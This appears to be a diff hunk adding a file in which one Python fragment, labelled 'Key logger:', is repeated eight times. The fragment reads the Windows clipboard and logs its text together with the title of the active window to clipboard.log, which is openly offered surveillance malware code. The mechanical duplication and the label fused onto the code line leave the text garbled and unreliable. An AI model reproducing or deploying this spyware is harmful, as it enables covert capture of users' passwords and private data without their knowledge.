@@ -1,0 +1,112 @@
+Key logger: def monitor_clipboard(self):
+        win32clipboard.OpenClipboard()
+        try:
+            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            if clipboard_data:
+                self.log_clipboard_data(clipboard_data)
+        except TypeError:
+            pass
+        win32clipboard.CloseClipboard()
+
+    def log_clipboard_data(self, clipboard_data):
+        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        with open("clipboard.log", "a") as f:
+            f.write(f"{active_window_title}: {clipboard_data}\n")
+Key logger: def monitor_clipboard(self):
+        win32clipboard.OpenClipboard()
+        try:
+            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            if clipboard_data:
+                self.log_clipboard_data(clipboard_data)
+        except TypeError:
+            pass
+        win32clipboard.CloseClipboard()
+
+    def log_clipboard_data(self, clipboard_data):
+        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        with open("clipboard.log", "a") as f:
+            f.write(f"{active_window_title}: {clipboard_data}\n")
+Key logger: def monitor_clipboard(self):
+        win32clipboard.OpenClipboard()
+        try:
+            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            if clipboard_data:
+                self.log_clipboard_data(clipboard_data)
+        except TypeError:
+            pass
+        win32clipboard.CloseClipboard()
+
+    def log_clipboard_data(self, clipboard_data):
+        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        with open("clipboard.log", "a") as f:
+            f.write(f"{active_window_title}: {clipboard_data}\n")
+Key logger: def monitor_clipboard(self):
+        win32clipboard.OpenClipboard()
+        try:
+            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            if clipboard_data:
+                self.log_clipboard_data(clipboard_data)
+        except TypeError:
+            pass
+        win32clipboard.CloseClipboard()
+
+    def log_clipboard_data(self, clipboard_data):
+        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        with open("clipboard.log", "a") as f:
+            f.write(f"{active_window_title}: {clipboard_data}\n")
+Key logger: def monitor_clipboard(self):
+        win32clipboard.OpenClipboard()
+        try:
+            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            if clipboard_data:
+                self.log_clipboard_data(clipboard_data)
+        except TypeError:
+            pass
+        win32clipboard.CloseClipboard()
+
+    def log_clipboard_data(self, clipboard_data):
+        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        with open("clipboard.log", "a") as f:
+            f.write(f"{active_window_title}: {clipboard_data}\n")
+Key logger: def monitor_clipboard(self):
+        win32clipboard.OpenClipboard()
+        try:
+            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            if clipboard_data:
+                self.log_clipboard_data(clipboard_data)
+        except TypeError:
+            pass
+        win32clipboard.CloseClipboard()
+
+    def log_clipboard_data(self, clipboard_data):
+        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        with open("clipboard.log", "a") as f:
+            f.write(f"{active_window_title}: {clipboard_data}\n")
+Key logger: def monitor_clipboard(self):
+        win32clipboard.OpenClipboard()
+        try:
+            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            if clipboard_data:
+                self.log_clipboard_data(clipboard_data)
+        except TypeError:
+            pass
+        win32clipboard.CloseClipboard()
+
+    def log_clipboard_data(self, clipboard_data):
+        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        with open("clipboard.log", "a") as f:
+            f.write(f"{active_window_title}: {clipboard_data}\n")
+Key logger: def monitor_clipboard(self):
+        win32clipboard.OpenClipboard()
+        try:
+            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+            if clipboard_data:
+                self.log_clipboard_data(clipboard_data)
+        except TypeError:
+            pass
+        win32clipboard.CloseClipboard()
+
+    def log_clipboard_data(self, clipboard_data):
+        active_window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        with open("clipboard.log", "a") as f:
+            f.write(f"{active_window_title}: {clipboard_data}\n")
